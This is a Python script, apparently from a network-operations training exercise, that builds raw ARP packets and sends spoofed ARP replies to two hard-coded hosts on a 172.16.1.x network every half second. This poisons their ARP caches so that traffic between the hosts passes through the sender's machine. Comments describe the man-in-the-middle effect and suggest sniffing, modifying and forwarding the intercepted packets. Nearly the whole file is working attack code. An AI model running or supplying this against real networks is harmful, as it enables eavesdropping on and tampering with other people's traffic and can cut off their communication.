#!/usr/bin/python3.7
"""
NOTE: Should verify this functionality.
Make sure that you enable ip forwarding
May need to disable firewall as well
"""
import socket
import struct
import cno_net_helper as cno
from time import sleep


# FOR LINUX - comment out the Windows line below
dev = "eno1"  # Device to send packet out
# FOR WINDOWS - comment out the Linux line above
#dev = "Intel(R) Ethernet Connection (5) I219-LM"  # Device to send packet out

def make_eth_hdr(dst_mac, src_mac, typ):
    dst = cno.mac_str_to_bin(dst_mac)
    src = cno.mac_str_to_bin(src_mac)
    return dst + src + struct.pack('>H', typ)


def make_arp_req(dst_ip, src_mac, src_ip):
    arpreq = b"\x00\x01"  	# HW type
    arpreq += b"\x08\x00"  	# Protocol type
    arpreq += b"\x06"  		# HW addr len
    arpreq += b"\x04"  		# Proto addr len
    arpreq += b"\x00\x01"  	# Op Code
    arpreq += cno.mac_str_to_bin(src_mac)
    arpreq += socket.inet_pton(socket.AF_INET, src_ip)
    arpreq += b"\x00" * 6  	# all zeroes
    arpreq += socket.inet_pton(socket.AF_INET, dst_ip)
    return arpreq


def send_arp_req(dst_ip, dst_mac, src_ip, src_mac):
    dst = cno.mac_str_to_bin(dst_mac)
    src = cno.mac_str_to_bin(src_mac)
    typ = b"\x08\x06"  		# ARP type
    arpreq = make_arp_req(dst_ip, src_mac, src_ip)
    etherhdr = dst + src + typ
    cno.rawsend(etherhdr + arpreq, dev)


def make_arp_resp(spoof_ip, src_mac, dst_mac, dst_ip):
    arpreq = b"\x00\x01"  	# HW type
    arpreq += b"\x08\x00"  	# Protocol type (IP)
    arpreq += b"\x06"  		# HW addr len
    arpreq += b"\x04"  		# Proto addr len
    arpreq += b"\x00\x02"  	# Op Code
    arpreq += cno.mac_str_to_bin(src_mac)
    arpreq += socket.inet_pton(socket.AF_INET, spoof_ip)
    arpreq += cno.mac_str_to_bin(dst_mac)
    arpreq += socket.inet_pton(socket.AF_INET, dst_ip)
    return arpreq


def send_arp_resp(spoof_ip, src_mac, dst_mac, dst_ip, spoof_mac):
    """
    """
    etherhdr = make_eth_hdr(dst_mac, spoof_mac, cno.ETH_TYPES['ARP'])
    arpreq = make_arp_resp(spoof_ip, src_mac, dst_mac, dst_ip)

    cno.rawsend(etherhdr + arpreq, dev)


src_ip = "172.16.1.100"  			# My machines ip address
target_a_ip = "172.16.1.190"
target_b_ip = "172.16.1.155"

src_mac = "a4:bb:6d:e1:8c:80" 		# My machines mac address
target_a_mac = "54:bf:64:90:0b:d8" 	# The target machines mac address
target_b_mac = "00:50:56:01:09:3b"

   # The ARP cache refreshes, so keep sending the ARP response to continue poisoning.
    # NOTE: we are NOT doing anything with the data - just watching.
    #   If we watch Wireshark, traffic between A and B should reach us.
    #   Unless we sniff and forward these packets, communication between A and B
    #   will be broken. Forwarding the packets would allow traffic between
    #   A and B to flow normally, while all going through us.
    #   Note that because the targets' IP addresses aren't on one of our interfaces,
    #   packets that arrive to our interface with the wrong IP address will
    #   likely be dropped, though we can still see them by sniffing the interface.
    #   We could write a program to sniff these packets, modify them, and forward
    #   them to their original destinations.
while True:
    sleep(0.5)
    # Fake connection for target a to target b
    send_arp_resp(target_b_ip, src_mac, target_a_mac, target_a_ip, target_b_mac)

    # Fake connection for target b to target a
    send_arp_resp(target_a_ip, src_mac, target_b_mac, target_b_ip, target_a_mac)
